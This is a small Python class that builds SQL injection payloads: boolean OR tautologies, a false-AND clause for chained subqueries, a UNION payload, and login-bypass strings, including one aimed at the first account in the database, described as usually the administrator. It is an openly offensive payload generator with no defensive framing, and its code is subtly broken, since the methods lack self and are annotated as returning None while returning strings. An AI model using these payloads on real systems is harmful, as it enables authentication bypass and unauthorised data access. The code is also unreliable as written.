class SQLInjectionBuilder:
    def __init__(self, engine) -> None:
        self.engine = engine

    def or_boolean_injection_quoted() -> None:
        """
        Useful for database condition checks
        """
        return f"\' OR 1=\"1\"; -- "

    def or_boolean_injection_unquoted() -> None:
        """
        Useful for database condition checks
        """
        return f"\' OR 1=1; -- "

    def false_and_boolean_injection(subquery: str) -> None:
        """
        Useful for database checks and using another query
        """
        return f"\' AND 1=\"2\" {subquery}"

    def union_injection(subquery: str) -> None:
        return f"UNION {subquery} -- "

    def login_user(usr_id: int) -> None:
        return f"\' or {usr_id}=\"{usr_id}\";-- "

    def login_admin() -> None:
        """
        Returns a possible way of getting to the first user on the database
        It usually means the administrator of the database
        """
        return SQLInjectionBuilder.login_user(1)